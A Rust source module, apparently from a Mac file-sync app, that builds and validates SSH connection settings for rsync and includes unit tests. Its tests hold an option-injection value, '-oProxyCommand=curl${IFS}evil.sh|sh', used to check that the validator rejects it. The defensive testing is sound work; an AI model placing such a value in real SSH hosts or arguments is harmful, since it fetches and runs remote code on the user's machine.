use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::path::Path;
use std::process::Stdio;
use std::sync::OnceLock;

use serde::{Deserialize, Serialize};
use tokio::process::Command;

/// Reuse one SSH connection across syncs. Without this every rsync run pays a
/// fresh TCP + key exchange (~0.5-1s), which dwarfs the transfer itself for the
/// small, frequent syncs a file watcher produces.
const CONTROL_PERSIST_SECS: u32 = 300;

/// How long ssh waits for a TCP connection before giving up.
///
/// Without this ssh inherits the kernel's SYN timeout — 75s on macOS
/// (`net.inet.tcp.keepinit`). Syncs run unattended in a loop, so a host that
/// has gone away costs 75 seconds per attempt and holds a session permit for
/// all of it, while the Test button next to it answers in ten.
const CONNECT_TIMEOUT_SECS: u32 = 10;

/// Absolute paths only, checked in order. `/usr/bin/ssh` comes first: on a
/// current macOS it sits on the SIP-protected system volume, so nothing — not
/// even root — can overwrite it, which is the strongest guarantee available
/// here. The Homebrew paths are only a fallback for the rare Mac where that
/// binary is somehow missing. Unlike rsync, there's no *capability* reason to
/// prefer a Homebrew build: every flag this app passes has existed in OpenSSH
/// for two decades. This list exists purely to resolve to a path nothing can
/// shadow, not to pick a "better" ssh.
const SSH_CANDIDATES: &[&str] = &["/usr/bin/ssh", "/opt/homebrew/bin/ssh", "/usr/local/bin/ssh"];

/// Resolved once per process and cached. Spawning a bare `"ssh"` searches
/// `$PATH`, so anything earlier on it than the real binary — a writable
/// directory, a shadowed Homebrew shim, a compromised shell profile picked up
/// when launched from a terminal — would run silently on every sync and every
/// connection test, with this app's SSH credentials. Falls back to the bare
/// name only if none of the candidates exist, which should not happen on a
/// real Mac; that fallback keeps ssh usable rather than hard-failing every
/// sync in a situation this app cannot otherwise recover from.
fn ssh_path() -> &'static str {
    static PATH: OnceLock<String> = OnceLock::new();
    PATH.get_or_init(|| {
        SSH_CANDIDATES
            .iter()
            .copied()
            .find(|p| Path::new(p).exists())
            .map(str::to_string)
            .unwrap_or_else(|| "ssh".to_string())
    })
    .as_str()
}

fn default_port() -> u16 {
    22
}

/// A named SSH destination, reusable across any number of sync profiles.
/// This is SyncPoint's own record — it never reads or writes ~/.ssh/config.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Connection {
    #[serde(default)]
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub user: String,
    pub host: String,
    #[serde(default = "default_port")]
    pub port: u16,
    /// Optional private key path. Empty means let ssh choose as it normally would.
    #[serde(default)]
    pub identity_file: String,
}

impl Connection {
    /// The invariants that must hold before any of these values reaches ssh or
    /// rsync, independent of which machine they are on.
    ///
    /// A leading `-` is the dangerous one. ssh parses a destination argument
    /// that starts with a dash as an *option*, so a host of
    /// `-oProxyCommand=<cmd>` makes ssh run that command through `/bin/sh`.
    /// rsync builds its own ssh command line out of the destination and gives
    /// no way to insert a `--` there, so the only place to stop it is here.
    ///
    /// Kept apart from [`Connection::validate`] because an import has to run
    /// these checks on a file written by someone else, where the machine-local
    /// ones — does this key file exist *here* — would reject a legitimate
    /// bundle from another Mac.
    pub fn check_safe(&self) -> Result<(), String> {
        let host = self.host.trim();
        if host.is_empty() {
            return Err("Host is required.".into());
        }
        if host.split_whitespace().count() > 1 {
            return Err("Host cannot contain spaces.".into());
        }
        if host.starts_with('-') {
            return Err("Host cannot start with a dash: ssh would read it as an option.".into());
        }
        let user = self.user.trim();
        if user.split_whitespace().count() > 1 {
            return Err("User cannot contain spaces.".into());
        }
        if user.starts_with('-') {
            return Err("User cannot start with a dash: ssh would read it as an option.".into());
        }
        if self.port == 0 {
            return Err("Port must be between 1 and 65535.".into());
        }

        let key = self.identity_file.trim();
        if !key.is_empty() {
            // rsync splits its `-e` value on whitespace with no way to quote,
            // so a key path containing a space would be torn into two args.
            if key.split_whitespace().count() > 1 {
                return Err("Key path cannot contain spaces.".into());
            }
            if key.starts_with('-') {
                return Err("Key path cannot start with a dash.".into());
            }
        }
        Ok(())
    }

    pub fn validate(&self) -> Result<(), String> {
        if self.name.trim().is_empty() {
            return Err("Connection name is required.".into());
        }
        self.check_safe()?;

        let key = self.identity_file.trim();
        if !key.is_empty() && !key.starts_with('~') && !Path::new(key).exists() {
            return Err(format!("Key file not found: {key}"));
        }
        Ok(())
    }

    /// `user@host`, or bare `host` when no user is set.
    pub fn target(&self) -> String {
        let host = self.host.trim();
        match self.user.trim() {
            "" => host.to_string(),
            user => format!("{user}@{host}"),
        }
    }

    /// Where this connection's ssh master listens. `~/.ssh` rather than a
    /// world-writable directory like /tmp.
    ///
    /// `%C` hashes what ssh resolved, so pointing an alias in ~/.ssh/config at a
    /// new host opens a new master rather than syncing on to the old one. But it
    /// leaves out the identity file, so a second key to the same user@host:port
    /// would ride the first key's master and its own `-i` would never be used.
    /// Hence the second hash. It covers the whole login, not only the key,
    /// because `AppState::session_limit` keys on this string unexpanded, where
    /// `%C` tells it nothing: two records with the same login share a master and
    /// a gate, and two different logins share neither.
    ///
    /// Short because the budget is tight: ssh first binds this path plus 17
    /// bytes, a unix socket path holds 103, and `%C` alone takes 40. Overflowing
    /// makes ssh exit 255 rather than just lose the reuse, and this leaves room
    /// for an account name of 21 characters.
    ///
    /// `DefaultHasher` may change between Rust releases. That costs one extra
    /// handshake at most, since a master only outlives its last client by
    /// [`CONTROL_PERSIST_SECS`].
    pub fn control_path(&self) -> String {
        let mut hasher = DefaultHasher::new();
        // Trimmed as they are on their way to ssh: the same login must mean the
        // same master.
        (
            self.user.trim(),
            self.host.trim(),
            self.port,
            self.identity_file.trim(),
        )
            .hash(&mut hasher);
        format!("~/.ssh/sp-{:08x}-%C", hasher.finish() as u32)
    }

    /// Everything after the `ssh` word. No element may contain whitespace:
    /// rsync re-splits the joined string when this is passed via `-e`.
    pub fn ssh_args(&self) -> Vec<String> {
        let mut args = vec!["-p".to_string(), self.port.to_string()];

        let key = self.identity_file.trim();
        if !key.is_empty() {
            args.push("-i".to_string());
            args.push(key.to_string());
            // Without this ssh still offers every key the agent holds before
            // the one that was asked for, and can hit MaxAuthTries first.
            args.push("-o".to_string());
            args.push("IdentitiesOnly=yes".to_string());
        }

        args.push("-o".to_string());
        args.push("ControlMaster=auto".to_string());
        args.push("-o".to_string());
        args.push(format!("ControlPath={}", self.control_path()));
        args.push("-o".to_string());
        args.push(format!("ControlPersist={CONTROL_PERSIST_SECS}"));
        // A missing key or unknown host fails immediately with a readable
        // error instead of blocking forever on a prompt nobody can see.
        args.push("-o".to_string());
        args.push("BatchMode=yes".to_string());
        args.push("-o".to_string());
        args.push(format!("ConnectTimeout={CONNECT_TIMEOUT_SECS}"));
        args
    }

    /// The full command for rsync's `-e`, as a single argv element. Starts
    /// with [`ssh_path`] rather than the bare word `ssh` — see its doc for
    /// why: the same reasoning that keeps rsync itself off `$PATH`.
    pub fn ssh_command(&self) -> String {
        format!("{} {}", ssh_path(), self.ssh_args().join(" "))
    }
}

/// Open a real SSH session and run `true`. Doubles as a warm-up: it primes the
/// ControlMaster socket, so the next sync skips the handshake.
pub async fn test(connection: &Connection) -> Result<String, String> {
    connection.validate()?;

    let mut args = connection.ssh_args();
    // Belt and braces over check_safe: `--` ends option parsing, so even a
    // destination that slipped through cannot be read as an ssh option.
    args.push("--".to_string());
    args.push(connection.target());
    args.push("true".to_string());

    let output = Command::new(ssh_path())
        .args(&args)
        .stdin(Stdio::null())
        .kill_on_drop(true)
        .output()
        .await
        .map_err(|e| format!("Could not start ssh: {e}"))?;

    if output.status.success() {
        return Ok(format!("Connected to {}.", connection.target()));
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    let detail = stderr
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap_or("ssh failed with no output");
    Err(format!(
        "{detail}\n\nKey auth must already work — run `ssh {}` in a terminal once to accept the host key and confirm the key is loaded.",
        connection.target()
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn connection() -> Connection {
        Connection {
            id: "c1".into(),
            name: "prod".into(),
            user: "deploy".into(),
            host: "example.com".into(),
            port: 2222,
            identity_file: String::new(),
        }
    }

    #[test]
    fn target_omits_the_user_when_unset() {
        let mut c = connection();
        assert_eq!(c.target(), "deploy@example.com");
        c.user = "  ".into();
        assert_eq!(c.target(), "example.com");
    }

    #[test]
    fn ssh_args_never_contain_whitespace() {
        let mut c = connection();
        c.identity_file = "~/.ssh/id_rsa".into();
        for arg in c.ssh_args() {
            assert!(
                !arg.contains(char::is_whitespace),
                "rsync would split {arg:?} into separate arguments"
            );
        }
    }

    #[test]
    fn every_ssh_the_app_runs_gives_up_on_an_unreachable_host() {
        // Without this ssh waits out the kernel SYN timeout — 75s on macOS —
        // on a path that runs unattended in a loop. It used to be set only on
        // the Test button, the one place a human was already waiting.
        assert!(connection().ssh_command().contains("ConnectTimeout="));
    }

    #[test]
    fn identity_file_brings_identities_only_with_it() {
        let mut c = connection();
        assert!(!c.ssh_args().contains(&"-i".to_string()));

        c.identity_file = "~/.ssh/id_rsa".into();
        let args = c.ssh_args();
        assert!(args.contains(&"-i".to_string()));
        assert!(args.contains(&"~/.ssh/id_rsa".to_string()));
        assert!(args.contains(&"IdentitiesOnly=yes".to_string()));
    }

    #[test]
    fn a_second_key_to_the_same_host_gets_its_own_master() {
        // A master keeps the identity it logged in with, so sharing one would
        // quietly run the second connection as the first connection's key.
        let mut work = connection();
        work.identity_file = "~/.ssh/id_work".into();
        let mut personal = connection();
        personal.identity_file = "~/.ssh/id_personal".into();

        assert_ne!(work.control_path(), personal.control_path());
        assert_ne!(work.control_path(), connection().control_path());
    }

    #[test]
    fn the_socket_name_follows_what_ssh_config_resolves() {
        // %C is the only part of the name that sees ~/.ssh/config. Without it,
        // pointing an alias at a new host would reuse the live master and keep
        // syncing to the old one for as long as files keep changing.
        assert!(connection().control_path().ends_with("-%C"));
    }

    #[test]
    fn a_different_login_never_shares_a_master() {
        let mut other_user = connection();
        other_user.user = "root".into();
        let mut other_host = connection();
        other_host.host = "example.org".into();
        let mut other_port = connection();
        other_port.port = 22;

        for other in [other_user, other_host, other_port] {
            assert_ne!(other.control_path(), connection().control_path());
        }
    }

    #[test]
    fn identical_logins_share_one_master() {
        // The whole point of multiplexing. What ssh receives is trimmed, and the
        // record's name and id never reach it, so neither may split the master.
        let mut c = connection();
        c.identity_file = "~/.ssh/id_work".into();
        let mut same = connection();
        same.id = "c2".into();
        same.name = "staging".into();
        same.user = " deploy ".into();
        same.host = " example.com ".into();
        same.identity_file = " ~/.ssh/id_work ".into();

        assert_eq!(c.control_path(), same.control_path());
    }

    #[test]
    fn the_control_socket_fits_under_a_long_home_directory() {
        // ssh binds this path plus ".XXXXXXXXXXXXXXXX" before moving it into
        // place (mux.c, muxserver_listen), and exits 255 if that overflows
        // sun_path. Any `%` token but %C, whose 40 hex digits are known, would
        // expand to a length this could not see.
        const TEMPORARY_SUFFIX: usize = 17;
        const SUN_PATH_MAX: usize = 103;

        let path = connection().control_path();
        assert_eq!(path.matches('%').count(), 1, "{path}");
        let expanded = path
            .replacen('~', &format!("/Users/{}", "a".repeat(21)), 1)
            .replacen("%C", &"0".repeat(40), 1);
        assert!(
            expanded.len() + TEMPORARY_SUFFIX <= SUN_PATH_MAX,
            "{expanded} is {} bytes before the suffix",
            expanded.len()
        );
    }

    #[test]
    fn ssh_command_always_carries_batch_mode_and_connection_reuse() {
        let command = connection().ssh_command();
        let program = command.split_whitespace().next().unwrap();
        assert!(
            Path::new(program).is_absolute(),
            "the ssh binary must be an absolute path, not searched on $PATH: {program}"
        );
        assert!(command.contains(" -p 2222 "));
        assert!(command.contains("BatchMode=yes"));
        assert!(command.contains("ControlMaster=auto"));
        assert!(command.contains("ControlPersist="));
        assert!(command.contains(&format!("ControlPath={}", connection().control_path())));
    }

    #[test]
    fn ssh_path_never_falls_through_to_a_path_searched_bare_name() {
        // The whole point of ssh_path(): never let a compromised $PATH entry
        // stand in for the real ssh binary.
        let path = ssh_path();
        assert!(Path::new(path).is_absolute(), "{path} is not absolute");
        assert!(
            SSH_CANDIDATES.contains(&path),
            "{path} is not one of the known candidates"
        );
    }

    #[test]
    fn a_leading_dash_is_refused_everywhere_ssh_would_read_it_as_an_option() {
        // ssh parses a destination beginning with `-` as an option, so a host
        // of `-oProxyCommand=<cmd>` runs that command through /bin/sh. rsync
        // builds its own ssh command line from the destination and offers no
        // `--`, so this has to be refused before it is ever stored.
        let mut c = connection();
        c.host = "-oProxyCommand=curl${IFS}evil.sh|sh".into();
        assert!(c.check_safe().is_err(), "no whitespace, so the space checks miss it");
        assert!(c.validate().is_err());

        let mut c = connection();
        c.user = "-oProxyCommand=x".into();
        assert!(c.check_safe().is_err());

        let mut c = connection();
        c.identity_file = "-oProxyCommand=x".into();
        assert!(c.check_safe().is_err());
    }

    #[test]
    fn check_safe_leaves_out_the_checks_that_only_hold_on_this_machine() {
        // An imported bundle names a key path from someone else's Mac. That is
        // not a reason to reject the connection, only a reason it cannot run
        // here yet — so the existence check belongs to validate() alone.
        let mut c = connection();
        c.identity_file = "/definitely/not/here/id_rsa".into();
        assert!(c.check_safe().is_ok());
        assert!(c.validate().is_err());
    }

    #[test]
    fn the_test_command_ends_option_parsing_before_the_destination() {
        let args = connection().ssh_args();
        // ssh_args itself carries no destination; test() appends `--` and then
        // the target, so a destination can never be read as an option.
        assert!(!args.contains(&"--".to_string()));
    }

    #[test]
    fn validate_rejects_values_that_would_break_arg_splitting() {
        let mut c = connection();
        c.identity_file = "/Users/me/my keys/id_rsa".into();
        assert!(c.validate().is_err());

        let mut c = connection();
        c.host = "example.com extra".into();
        assert!(c.validate().is_err());

        let mut c = connection();
        c.identity_file = "/definitely/not/here/id_rsa".into();
        assert!(c.validate().is_err());

        // `~` paths are expanded by ssh itself, so existence is not checked here.
        let mut c = connection();
        c.identity_file = "~/.ssh/id_rsa".into();
        assert!(c.validate().is_ok());
    }
}
